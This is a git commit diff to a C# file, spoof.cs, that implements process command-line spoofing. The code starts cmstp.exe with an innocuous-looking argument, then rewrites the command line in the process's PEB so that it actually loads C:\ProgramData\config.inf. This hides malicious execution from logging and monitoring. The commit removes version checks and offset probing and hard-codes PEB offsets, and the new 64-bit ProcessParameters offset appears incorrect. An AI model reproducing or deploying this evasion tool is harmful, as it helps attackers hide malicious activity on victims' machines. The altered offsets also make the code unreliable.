379f7e939258460c5f1db1ac357e1354aa0bd8a1
Justanother-engineer <charanmk99@gmail.com>
2026-07-11 00:02:15 +0530

    updated code

--- spoof.cs
+++ spoof.cs
@@ -26,26 +26,6 @@ public static class Spoof
         int cb,
         out int returnLength);
 
-    [DllImport("ntdll.dll")]
-    private static extern int RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInfo);
-
-    [StructLayout(LayoutKind.Sequential)]
-    private struct OSVERSIONINFOEXW
-    {
-        public uint dwOSVersionInfoSize;
-        public uint dwMajorVersion;
-        public uint dwMinorVersion;
-        public uint dwBuildNumber;
-        public uint dwPlatformId;
-        [MarshalAs(UnmanagedType.LPWStr)]
-        public string szCSDVersion;
-        public ushort wServicePackMajor;
-        public ushort wServicePackMinor;
-        public ushort wSuiteMask;
-        public byte wProductType;
-        public byte wReserved;
-    }
-
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool ReadProcessMemory(
         IntPtr hProcess,
@@ -114,7 +94,7 @@ public static class Spoof
         public IntPtr InheritedFromUniqueProcessId;
     }
 
-    private const int CommandLineOffsetFallback = 0x70;
+    private const int CommandLineOffset = 0x70;
 
     private static void Log(string msg)
     {
@@ -131,11 +111,6 @@ public static class Spoof
     {
         string spoofedCmd = "cmstp.exe /s C:\\Windows\\System32\\cmstp.inf";
         string realCmd = "cmstp.exe /s C:\\ProgramData\\config.inf";
-
-        OSVERSIONINFOEXW osvi = new OSVERSIONINFOEXW();
-        osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(osvi);
-        RtlGetVersion(ref osvi);
-        Log("[+] OS build " + osvi.dwBuildNumber);
 
         STARTUPINFO si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
@@ -164,9 +139,9 @@ public static class Spoof
             CloseHandle(pi.hThread);
             return;
         }
-        Log("[+] PEB located at 0x" + pbi.PebBaseAddress.ToString("X"));
+        Log("[+] PEB located");
 
-        byte[] pebBuffer = new byte[IntPtr.Size * 5];
+        byte[] pebBuffer = new byte[IntPtr.Size * 4];
         int bytesRead;
         if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebBuffer, pebBuffer.Length, out bytesRead))
         {
@@ -176,56 +151,14 @@ public static class Spoof
             CloseHandle(pi.hThread);
             return;
         }
-        Log("[+] PEB read (" + bytesRead + " bytes)");
+        Log("[+] PEB read");
 
-        int ppOffset = IntPtr.Size == 8 ? 0x20 : 0x10;
+        int ppOffset = IntPtr.Size == 8 ? 0x18 : 0x0C;
         IntPtr processParametersPtr = Marshal.ReadIntPtr(pebBuffer, ppOffset);
-        Log("[+] ProcessParameters at 0x" + processParametersPtr.ToString("X"));
-
-        int[] offsetsToTry = { 0x70, 0x78, 0x80, 0x88 };
-        int commandLineOffset = -1;
-        
-        foreach (int offset in offsetsToTry)
-        {
-            byte[] testBuffer = new byte[16];
-            bool readOk = ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, offset), testBuffer, testBuffer.Length, out bytesRead);
-            
-            if (readOk)
-            {
-                ushort length = BitConverter.ToUInt16(testBuffer, 0);
-                ushort maxLength = BitConverter.ToUInt16(testBuffer, 2);
-                IntPtr bufferPtr = IntPtr.Size == 8 ? 
-                    (IntPtr)BitConverter.ToInt64(testBuffer, 8) : 
-                    (IntPtr)BitConverter.ToInt32(testBuffer, 8);
-                
-                string bytesHex = BitConverter.ToString(testBuffer).Replace("-", " ");
-                Log("[DEBUG] Offset 0x" + offset.ToString("X") + ": Read=OK, Length=" + length + ", MaxLength=" + maxLength + ", Buffer=0x" + bufferPtr.ToString("X"));
-                Log("[DEBUG]   Bytes: " + bytesHex);
-                
-                if (length > 0 && maxLength >= length && bufferPtr != IntPtr.Zero)
-                {
-                    commandLineOffset = offset;
-                    Log("[+] Found valid CommandLine at offset 0x" + offset.ToString("X"));
-                    break;
-                }
-            }
-            else
-            {
-                Log("[DEBUG] Offset 0x" + offset.ToString("X") + ": Read=FAILED");
-            }
-        }
-
-        if (commandLineOffset == -1)
-        {
-            Log("[-] Could not find valid CommandLine offset");
-            ResumeThread(pi.hThread);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            return;
-        }
+        Log("[+] ProcessParameters resolved");
 
         byte[] cmdBuffer = new byte[16];
-        if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, commandLineOffset), cmdBuffer, cmdBuffer.Length, out bytesRead))
+        if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out bytesRead))
         {
             Log("[-] ReadProcessMemory(cmdPtr) FAILED");
             ResumeThread(pi.hThread);
@@ -236,10 +169,10 @@ public static class Spoof
         Log("[+] Command line pointer read");
 
         byte[] newCmdBytes = Encoding.Unicode.GetBytes(realCmd);
-        IntPtr bufferPtr2 = Marshal.ReadIntPtr(cmdBuffer, 8);
+        IntPtr bufferPtr = Marshal.ReadIntPtr(cmdBuffer, 8);
 
         int written;
-        if (!WriteProcessMemory(pi.hProcess, bufferPtr2, newCmdBytes, newCmdBytes.Length, out written))
+        if (!WriteProcessMemory(pi.hProcess, bufferPtr, newCmdBytes, newCmdBytes.Length, out written))
         {
             Log("[-] WriteProcessMemory(cmd) FAILED");
             ResumeThread(pi.hThread);
@@ -253,7 +186,7 @@ public static class Spoof
         byte[] maxLengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
         Buffer.BlockCopy(lengthBytes, 0, cmdBuffer, 0, 2);
         Buffer.BlockCopy(maxLengthBytes, 0, cmdBuffer, 2, 2);
-        WriteProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, commandLineOffset), cmdBuffer, cmdBuffer.Length, out written);
+        WriteProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out written);
         Log("[+] Command line length updated");
 
         Log("[*] Resuming cmstp.exe thread...");
